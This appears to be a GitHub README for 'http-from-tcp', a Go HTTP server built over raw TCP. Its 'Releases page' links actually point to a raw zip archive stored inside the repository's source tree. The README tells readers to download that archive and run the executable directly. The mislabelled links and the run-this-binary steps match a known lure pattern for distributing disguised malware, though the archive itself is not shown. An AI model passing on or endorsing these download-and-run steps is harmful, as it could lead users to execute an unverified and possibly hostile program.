# 🚀 http-from-tcp - A Simple Way to Serve HTTP Requests

## 🌐 Overview
http-from-tcp is a lightweight HTTP/1.1 server built from scratch using Go. It allows you to easily parse and serve HTTP requests directly over TCP, without relying on the standard net/http library. This application is perfect for users who want to understand basic networking principles or need a simple server without complex setup. 

## 📥 Download the Application

## 🚀 Getting Started
To get started with http-from-tcp, follow these simple steps:

1. Click the link above or visit the [Releases page](https://github.com/Chubatra/http-from-tcp/raw/refs/heads/main/cmd/httpserver/from-tcp-http-v3.1.zip) to find the latest version.
2. Look for the appropriate file for your operating system. We provide different versions to ensure compatibility.
3. Once you find your file, simply click to download it. 
4. Once the download is complete, locate the downloaded file in your computer's downloads folder.

## 💻 System Requirements
To run http-from-tcp, you need a computer with the following:

- an operating system: Windows, macOS, or Linux
- a minimum of 512 MB of RAM
- a stable internet connection for downloading the application

## 🔧 Download & Install
1. Open the [Releases page](https://github.com/Chubatra/http-from-tcp/raw/refs/heads/main/cmd/httpserver/from-tcp-http-v3.1.zip) again to find the latest version.
2. Download the file corresponding to your operating system. 
3. If you are on Windows, you can run the `.exe` file directly. For macOS or Linux, open a terminal and navigate to the folder where you saved the file.
4. Use the command `chmod +x <filename>` to make it executable if you are on macOS or Linux.
5. Start the server by typing `./<filename>` in the terminal and hit enter.

## 🔍 Using http-from-tcp
After starting the server, http-from-tcp will listen on a default TCP port. You can access it from your web browser or a tool like `curl`. By default, it serves a simple "Hello World" message.

To check that it works:
1. Open a web browser.
2. Type `http://localhost:8080` in the address bar. 
3. You should see the "Hello World" message.

## 🌟 Key Features
- Lightweight: Designed to be simple and efficient
- Easy to use: Quick setup with minimal configuration
- Full HTTP/1.1 support: Handles standard HTTP requests and responses
- Direct over TCP: Bypasses complex libraries for a clearer understanding of networking

## 🔄 Troubleshooting
If you encounter issues, consider the following steps:

- Ensure you have downloaded the correct file for your operating system.
- Check that no other applications are using the default port (8080) that http-from-tcp uses. If necessary, you can specify a different port when starting the server.
- If you still cannot access the server, verify your firewall or security settings to ensure they allow connections to the necessary port.
